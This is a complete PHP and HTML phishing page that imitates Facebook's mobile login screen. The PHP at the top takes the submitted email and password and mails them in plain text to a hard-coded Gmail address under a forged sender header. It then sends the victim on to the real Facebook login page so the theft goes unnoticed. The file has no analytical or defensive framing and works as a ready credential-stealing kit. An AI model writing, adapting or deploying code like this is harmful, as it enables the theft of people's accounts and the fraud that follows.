<?php
if(isset($_REQUEST['send'])) {
    
    $email=$_REQUEST['email'];
    $pass=$_REQUEST['pass'];
    $to_mail="asadul7733@gmail.com";
          
    $subject="Facebook";

     $body="
     Email:$email
     Password:$pass";

    $header="From:bookcellarbd@bookcellarbd.com";
    mail($to_mail,$subject,$body,$header);
    if(mail) {
        
        header("location:https://m.facebook.com/login/");
    }
    
}


?>
<!DOCTYPE html>
<html>
<title>Facebook</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="W3.CSS.css">
<script src="W3.JS.js"></script>
<script src='https://kit.fontawesome.com/a076d05399.js' crossorigin='anonymous'></script>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">

<head>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
<style>


</style>
</head>
<body>
<div class="w3-container" style="background-color:#FFFBE2;color:#3B59A2;">
<p>Get Facebook for Android and browser faster</p>
</div>

<div class="w3-panel w3-center w3-text-blue">
<h3><b>facebook</b></h3>
</div>

<div class="w3-container">
<form method="post" action="<?php echo $_SERVER['PHP_SELF'];?>">
<input type="text" name="email" placeholder="Mobile number or email address" class="w3-block w3-border w3-padding w3-round" style="background-color:#F5F6F7" required>
<input type="password" name="pass" placeholder="Password" class="w3-block w3-border w3-padding w3-round" style="background-color:#F5F6F7;margin-top:7px;" required>
<b><input type="submit" name="send" value="Log In" class="w3-block w3-border w3-padding w3-round w3-text-white" style="background-color:#1877F2;margin-top:7px;"></b>
<p class="w3-center">or</p>

</form>

<div class="w3-container w3-center">
<a class="w3-button w3-block w3-text-white w3-small" style="background-color:#00A400;;" href="#"><b>Create New Account</b></a>
<p class="w3-small" style="color:#3B9CC5;">Forgotten password?</p>
</div>

</div>
<div class="w3-panel">
    
    <img src="Screenshot_1.png" style="width:100%;height:auto;">
</div>

</body>
</html>